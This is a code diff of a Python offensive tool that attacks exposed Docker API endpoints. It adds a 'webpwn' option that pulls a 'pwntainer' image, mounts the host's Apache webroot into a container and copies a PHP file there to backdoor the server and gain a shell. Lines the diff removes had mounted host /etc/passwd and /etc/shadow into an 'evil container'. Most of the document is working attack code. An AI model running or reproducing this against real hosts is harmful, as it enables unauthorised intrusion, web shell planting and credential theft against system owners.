@@ -51,8 +51,8 @@ def list_images(host, token):
 	print(table.table)
 
 
-def check_image(name):
-	img = image.Image(sys.argv[1], sys.argv[2])
+def check_image(name, host, token):
+	img = image.Image(host, 1, token)
 	images = []
 	for imag in img.list_images():
 		images.append(imag['RepoTags'])
@@ -62,9 +62,21 @@ def check_image(name):
 		else:
 			pass
 
-def pull_image(name):
-	img = image.Image(sys.argv[1], 1)
+def pull_image(name, host, token):
+	img = image.Image(host, 1, token)
 	img.pull_image(name)
+
+def webpwn(host, token):
+	# Backdoors the hosts apache server
+	webroot = "/var/www/html"
+	pwntainer = containers.Containers(host, 1, token)
+	print("[*] Creating pwntainer, evil container...")
+	pwntainer.create_container("eviltainer", ["/var/www/html:/var/www/html/"])
+	print("[+] Container created successfully\n[*] Starting the container...")
+	pwntainer.start_container()
+	print("[*] Starting host apache server poisoning...")
+	pwntainer.exec_cmd(["cp", "/data/tmp.php", "/var/www/html/"])
+	print("[+] Backdoor planted successfull...\n[*] Gaining command shell...")
 
 
 def commads():
@@ -81,9 +93,9 @@ def commads():
 	_containers.add_argument('-I' , '--list-images', dest='listi', help='List available images in the target endpoint. ', action='store_true')
 	_containers.add_argument('-N' , '--list-networks' , help='List networks in the remote target endpoint. ', action ='store_true')
 
-	_attack = _parser.add_argument_group('Attacks Surfac')
+	_attack = _parser.add_argument_group('Attacks Surface')
 	_attack.add_argument('-pj' , '--pwnwithJohn', metavar='')
-	_attack.add_argument('-wp' , '--webpwn', metavar='')
+	_attack.add_argument('-wp' , '--webpwn', dest="webpwn", help='Plant a backdoor in host\'s apache service', action='store_true')
 	_attack.add_argument('-sp' , '--sshpwn', metavar='')
 	_attack.add_argument('-a', '--all', metavar='')
         
@@ -103,70 +115,23 @@ def commads():
 		list_containers(_commands.Host, _token)
 		print("[+] Done!\n")
 
-	"""
-	elif _commands.creat:
-		_containerName = raw_input('\033[1;33;40m[+]Enter container to create: ')
-		_mountVolume = raw_input('\033[1;33;40m[+]Enter the volume to mount: ')
-		_container.create_container(_containerName, _mountVolume)
-	"""
-
-	"""
-	elif _commands.start:
-		print'\033[1;35;40m[*]Starting containers..'
-		if _container.start_container() == 'True':
-			print'\033[1;35;40m[*]Container successfully started.'
-		else:
-			print'\033[1;31;40m[-]Unable to start container...'
-	"""
-
 	if _commands.listi:
 		print("[*] Getting a list of docker images present...")
 		list_images(_commands.Host, _token)
 		print("[+] Done!")
+
+	if _commands.webpwn:
+		print("[*] Checking if the evil pwntainer image exists...")
+		if check_image("sethmwabe/pwntainer", _commands.Host, _token):
+			print("[+] Pwntainer evil image exists")
+		else:
+			print("[-] Evil pwnstainer image not found, fetching...")
+			pull_image("sethmwabe/pwntainer", _commands.Host, _token)
+			print("[+]Image pull successful")
+		webpwn(_commands.Host, _token)
 	
-	"""
-	elif _commands.pull:
-		_imageName = raw_input('\033[1;33;40m[+]Enter the image to pull: ')
-		print '\033[1;33;40m[+]Pulling {} this will take some time...'.format(_imageName)
-		
-				def check_image(_imageName):
-                    _images.pull_image(_imageName)
-                    if 'success':
-                        print'\033[1;35;40m[*]Image pulled.'
-                    else :
-                        print'\033[1;31;40m[-] {}'.format(_pull)
-	
-	elif _commands.delete:
-		_imageName = raw_input('\033[1;33;40m[+]Enter the image to delete: ')
-		_images.remove_image(_imageName)
-	"""
-
-	
-
-
-
 def main():
 	commads()
-	"""
-        print("\n")
-	print("[*] Checking if the evil pwntainer image exists...")
-	if check_image("ubuntu:18.04"):
-		print("[+] Pwntainer evil image exists")
-	else:
-		print("[-] Evil pwnstainer image not found, fetching...")
-		pull_image("ubuntu:18.04")
-		print("[+]Image pull successful")
-
-	# Start the evil container, mounting the various host filesystems.
-	pwntainer = containers.Containers(sys.argv[1], 1)
-	print("[*] Starting the pwntainer evil container")
-	pwntainer.create_container("eviltainer", ["/etc/passwd:/etc/passwd", "/etc/shadow:/etc/shadow"])
-	print("[+] Evil container created successfully")
-	print("[*] Starting the eviltainer container")
-	pwntainer.start_container()
-	print("[*] Starting host poisoning")
-	# Todo exec on container
-
-	"""
+	
 if __name__=="__main__":
 	main()
